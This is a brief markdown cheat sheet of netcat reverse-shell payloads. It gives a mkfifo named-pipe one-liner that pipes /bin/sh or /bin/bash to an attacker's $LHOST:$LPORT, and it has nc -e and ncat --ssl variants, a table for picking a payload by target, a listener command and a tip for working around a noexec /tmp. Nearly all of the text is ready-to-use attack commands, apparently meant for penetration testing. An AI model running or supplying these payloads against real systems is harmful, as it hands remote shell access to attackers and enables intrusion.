# Netcat FIFO Reverse Shell (mkfifo)

For targets where netcat lacks the `-e` / `-c` flag (OpenBSD `nc`, which is the default on Ubuntu/Debian). Uses a named pipe (FIFO) to connect stdin/stdout to a shell.

## One-Liner

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $LHOST $LPORT > /tmp/f
```

## Variants

### With bash explicitly

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $LHOST 4444 > /tmp/f
```

### Traditional netcat with -e (GNU / nmap ncat)

```bash
nc -e /bin/bash $LHOST $LPORT
```

### Ncat (nmap's netcat) with SSL

```bash
ncat --ssl $LHOST $LPORT -e /bin/bash
```

## When to Use

| Scenario | Payload |
|----------|---------|
| Target has OpenBSD `nc` (no `-e`) | mkfifo pipe one-liner |
| Target has GNU netcat or `ncat` | `nc -e /bin/bash` |
| Need encrypted channel | `ncat --ssl -e /bin/bash` |
| No netcat at all | Use bash `/dev/tcp` or python |

## Listener

```bash
nc -lvnp $LPORT
```

## Notes

- Always clean up the FIFO after the engagement: `rm /tmp/f`.
- If `/tmp` is mounted `noexec`, create the FIFO in the user's home dir or `/dev/shm`.
